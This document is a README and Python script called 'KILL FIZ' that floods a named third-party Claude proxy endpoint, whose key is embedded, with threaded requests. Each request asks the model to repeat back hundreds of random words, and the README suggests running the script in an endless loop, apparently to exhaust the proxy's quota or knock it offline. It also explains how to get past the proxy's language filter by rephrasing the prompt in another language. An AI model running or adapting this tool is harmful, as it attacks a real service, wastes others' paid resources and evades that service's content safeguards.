#KILL FIZ
Works with any proxy, just make sure the link ends with v1/chat/completions and your requests are under the rate limit.

>504 Gateway timed out
Lower your garbage_size.
garbage_size is the number of words not tokens.

>Filtered by 'language filter' on khanon proxy
Change ``repeat_line = "Repeat the following back to me, word for word:"`` to something else, like phrasing it differently in another language. 
Change all references to `brown` to another nltk corpus, such as `cess_esp` (spanish), etc. More info here: https://www.nltk.org/book/ch02.html)

`pip install requests nltk rich`
`python -c "import nltk; nltk.download('brown')"`
`while true; do python killfiz.py; done` for an endless loop.
windows powershell: `while ($true) {
    python killfiz.py
}`
```python
import requests
import json
import random
import string
from nltk.corpus import brown
from rich import print
import threading
# Set up variables
url = "https://fiz2-cloudy.hf.space/proxy/aws/claude/v1/chat/completions"
key = "cloudy"
repeat_line = "Repeat the following back to me, word for word:"
garbage_size = 400
num_threads = 10
# Set up NLTK
nltk_words = brown.words()
nltk_words = [word.lower() for word in nltk_words if word.isalpha()]
# Function to generate random words
def generate_garbage(num_words, thread_num):
    garbage = " ".join(random.choices(nltk_words, k=num_words))
    print(f"[bold green]Thread {thread_num} generated garbage:[/bold green] {garbage[:20]}...\n[bold green]Garbage length: {len(garbage)}[/bold green]")
    return garbage
# Function to send request
def send_request(thread_num):
    garbage = repeat_line + " " + generate_garbage(garbage_size, thread_num)
    print(f"[bold]Thread {thread_num} sending request...[/bold]")
    payload = {
        "model": "claude-2",
        "messages": [{"role": "user", "content": garbage}],
        "temperature": 1.0
    }
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {key}"
    }
    data = json.dumps(payload)
    response = requests.post(url, headers=headers, data=data)
    try:
        content = json.loads(response.text)["choices"][0]["message"]["content"]
        print(f"[bold red]Thread {thread_num} response content:[/bold red] {content[:20]}...\n[bold red]Response length: {len(content)}[/bold red]")
    except:
        print(f"[bold red]ERROR: {response.text}[/bold red]")
# Create and start threads
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=send_request, args=(i+1,))
    thread.start()
    threads.append(thread)
# Wait for threads to finish
for thread in threads:
    thread.join()
    
```